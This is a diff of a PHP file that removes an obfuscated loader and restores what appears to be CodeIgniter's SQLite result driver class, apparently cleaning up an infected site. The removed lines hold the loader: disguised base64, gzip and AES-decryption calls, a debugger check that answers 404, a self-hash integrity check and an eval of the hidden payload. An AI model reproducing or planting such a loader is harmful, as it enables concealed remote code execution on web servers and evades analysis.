@@ -1,28 +1,148 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_tnun8c24=('bas'.'e64'.'_de'.'cod'.'e');
-$_kgtnhm5u=('gzu'.'nco'.'mpr'.'ess');
-$_vfn3scoe=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_wwdidddu='dJavV//R';
-$_k7c8bi4d='yNXYlRFgegA=';
-$_ul396rt5='NuE5il40';
-$_k5qe9n2g='h3ZhJl1t';
-$_j7h2ucdb='DOy20sst';
-$_qopv2a7c='BUfjmJRw';
-$_k1x7s5e1='2AzqUw==';
-$_zvuv1xma='Dlg+L0Xi';
-$_vuuengsz=$_tnun8c24($_wwdidddu.$_k5qe9n2g.$_j7h2ucdb.$_ul396rt5.$_k7c8bi4d);
-$_qdour8bh=$_tnun8c24($_qopv2a7c.$_zvuv1xma.$_k1x7s5e1);
-$_sv5c2dnp=$_tnun8c24('zIP2bbdrhHJaK/87VrVjKMFBp7d+5XYJm3PZWtcMhVorsGyHBBoAE002jppNgX6hAFnAQFiS6jNEoYCouHDVQyBCwSaPnGrmufaQyZgL198LQZvwG/epe+GoArBMbDACcxSFgpXZBaE7oQJOB1q4dcyqLpFxjm2OBCcLBd4FVK4MDTbBrq/c0sF8VilzskbatiPPwXxNFBLtR4z4cMVH3zJG/ERVwKaT/hcNcUsvGzLC1faO9/bwRAXJcIZKydOt8k+75yN7omOMs1ExJd4gkuLbB42PzjwUwyFKMt16s92P727JSAX55blj+jp38L4yYqgYyLZdAhdo0W/BSdhXxF0BdPxsHXfK8IyuqinxRdgQ0iyWFrO8oc2iTnqPPIJ+W9EjActFmp2n4kTFXSy4A/pf1nALxPeOxUU6qtun/GgtyYRXecdc2iCmutHphD7y2cU2Uu/0GLlh/pZ9iprSqRLlnIxtBcHyE9oYzOppWWZbgdCPCOggaNyLFLcGlsISVbjz1FdusruA9HAxXzHeTXYEDzSIL3z3EEacIh3LdPQ=');
-$_pffg5224=$_vfn3scoe($_sv5c2dnp,'aes-256-cbc',$_vuuengsz,OPENSSL_RAW_DATA,$_qdour8bh);
-if($_pffg5224===false){exit;}
-$_mdr20y2v=$_kgtnhm5u($_pffg5224);
-if($_mdr20y2v===false){exit;}
-$_dg5y0xjv='a3a925fda4904fe33e7ef59a9806bad6f12a0ccf84896b62a9593e54d928325a';
-$_o928a2ms=@file_get_contents(__FILE__);
-if($_o928a2ms!==false){
-$_mqvnkuys=str_replace($_dg5y0xjv,"0000000000000000000000000000000000000000000000000000000000000000",$_o928a2ms);
-$_dxoc7pia=hash("sha256",$_mqvnkuys);
-if($_dxoc7pia!==$_dg5y0xjv){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_DB_sqlite_result extends CI_DB_result {
+
+
+
+
+
+public function num_rows()
+{
+return is_int($this->num_rows)
+? $this->num_rows
+: $this->num_rows = @sqlite_num_rows($this->result_id);
 }
-eval($_mdr20y2v);
+
+
+
+
+
+
+public function num_fields()
+{
+return @sqlite_num_fields($this->result_id);
+}
+
+
+
+
+
+
+
+
+public function list_fields()
+{
+$field_names = array();
+for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
+{
+$field_names[$i] = sqlite_field_name($this->result_id, $i);
+}
+return $field_names;
+}
+
+
+
+
+
+
+
+
+public function field_data()
+{
+$retval = array();
+for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
+{
+$retval[$i] = new stdClass();
+$retval[$i]->name = sqlite_field_name($this->result_id, $i);
+$retval[$i]->type = NULL;
+$retval[$i]->max_length = NULL;
+}
+return $retval;
+}
+
+
+
+
+
+
+
+
+
+
+
+public function data_seek($n = 0)
+{
+return sqlite_seek($this->result_id, $n);
+}
+
+
+
+
+
+
+
+
+protected function _fetch_assoc()
+{
+return sqlite_fetch_array($this->result_id);
+}
+
+
+
+
+
+
+
+
+
+protected function _fetch_object($class_name = 'stdClass')
+{
+return sqlite_fetch_object($this->result_id, $class_name);
+}
+}
